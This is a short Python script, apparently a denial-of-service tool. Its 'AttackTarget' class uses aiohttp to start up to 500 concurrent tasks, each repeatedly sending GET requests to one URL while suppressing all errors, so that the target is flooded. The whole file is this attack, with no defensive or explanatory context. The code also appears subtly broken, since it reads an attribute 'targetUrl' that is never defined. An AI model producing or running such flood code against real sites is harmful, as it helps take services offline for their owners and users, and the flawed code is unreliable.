import aiohttp
import asyncio


async def attack(session, addr, stopFlag):
    while not stopFlag.is_set():
        try:
            async with session.get(addr) as response:
                await response.text()
        except:
            pass
        await asyncio.sleep(0.001)


class AttackTarget:
    def __init__(self):
        self._target = ""
        self.sessionCount = 500
        self.maxSessionCount = 500
        self._stop_flag = asyncio.Event()
        self._tasks = []

    async def attack(self):
        "Attack start"
        if self.targetUrl:
            self._stop_flag.clear()
            async with aiohttp.ClientSession() as session:
                self._tasks = [
                    asyncio.create_task(
                        attack(session, self.targetUrl, self._stop_flag)
                    )
                    for _ in range(min(self.sessionCount, self.maxSessionCount))
                ]
                await asyncio.gather(*self._tasks)

    def stop(self):
        self._stop_flag.set()
        for task in self._tasks:
            if not task.done():
                task.cancel()

    @property
    def target(self):
        return self._target

    @target.setter
    def target(self, value):
        self._target = value
